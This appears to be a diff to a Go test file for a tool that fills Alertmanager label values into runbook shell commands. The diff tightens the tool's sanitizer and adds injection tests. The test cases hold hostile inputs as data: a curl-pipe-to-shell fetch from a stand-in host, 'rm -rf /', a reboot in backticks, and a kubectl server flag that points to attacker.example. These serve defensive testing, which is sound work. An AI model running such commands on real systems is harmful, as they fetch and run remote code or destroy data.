@@ -2,10 +2,32 @@ package main
 
 import (
 	"regexp"
+	"slices"
 	"strings"
 	"testing"
 	"text/template"
 )
+
+// TestLabelPlaceholderAllowlistIsPinned fails when a label is added so the
+// author checks it first: its values must be Kubernetes-name or host:port
+// shaped (the sanitizer keeps only [a-zA-Z0-9._:/-]) and never a secret.
+func TestLabelPlaceholderAllowlistIsPinned(t *testing.T) {
+	want := []string{
+		"alertname", "app", "cluster", "container", "deployment", installationLabel,
+		"instance", "job", "namespace", "node", "pod", "service",
+	}
+	got := make([]string, 0, len(labelPlaceholderAllowlist))
+	for name, ok := range labelPlaceholderAllowlist {
+		if ok {
+			got = append(got, name)
+		}
+	}
+	slices.Sort(got)
+	slices.Sort(want)
+	if !slices.Equal(got, want) {
+		t.Errorf("labelPlaceholderAllowlist changed:\n got  %v\n want %v\nCheck the new label's values are name-shaped and secret-free, then update this list.", got, want)
+	}
+}
 
 // labelDirective mirrors the exact AM Go-template directive
 // substituteLabelPlaceholders emits for an allowlisted label (CL-05):
@@ -13,7 +35,7 @@ import (
 // length-capped before it lands in a copy-paste shell fence. Kept here
 // so the pinning tests read cleanly instead of repeating the filter.
 func labelDirective(name string) string {
-	return "{{ .Labels." + name + ` | reReplaceAll "[^a-zA-Z0-9._:/-]" "" | printf "%.128s" }}`
+	return "{{ .Labels." + name + ` | reReplaceAll "[^a-zA-Z0-9._:/-]" "" | reReplaceAll "^-+" "" | printf "%.128s" }}`
 }
 
 // TestExtractQuickDiagnostics drives the markdown parser against the
@@ -130,6 +152,7 @@ func TestSubstituteLabelPlaceholders(t *testing.T) {
 		{"no placeholders", "psql -c 'SELECT 1'", "psql -c 'SELECT 1'"},
 		{"shell comments left alone", "# <namespace> is the alert's namespace\nkubectl get pod -n <namespace>", "# <namespace> is the alert's namespace\nkubectl get pod -n " + labelDirective("namespace")},
 		{"SQL comments left alone", "-- <instance> comes from the alert\nSELECT * FROM pg_stat_activity WHERE host = '<instance>';", "-- <instance> comes from the alert\nSELECT * FROM pg_stat_activity WHERE host = '" + labelDirective("instance") + "';"},
+		{"shell flag continuation is a command", "kubectl get pods \\\n  --namespace <namespace>", "kubectl get pods \\\n  --namespace " + labelDirective("namespace")},
 		{"indented comment still skipped", "   # <pod> here\nkubectl logs <pod>", "   # <pod> here\nkubectl logs " + labelDirective("pod")},
 	}
 
@@ -189,6 +212,8 @@ func TestSubstitutedPlaceholderStripsShellInjection(t *testing.T) {
 		{"command substitution", "$(curl evil.sh|sh)", "kubectl describe node curlevil.shsh"},
 		{"backtick substitution", "`reboot`", "kubectl describe node reboot"},
 		{"semicolon chaining", "n1; rm -rf /", "kubectl describe node n1rm-rf/"},
+		{"kubectl server flag", "-shttps://attacker.example", "kubectl describe node shttps://attacker.example"},
+		{"flag hidden behind stripped space", " --server=x", "kubectl describe node serverx"},
 		{"benign hostname preserved", "web-01.prod.svc:8080", "kubectl describe node web-01.prod.svc:8080"},
 	}
 	for _, tc := range cases {
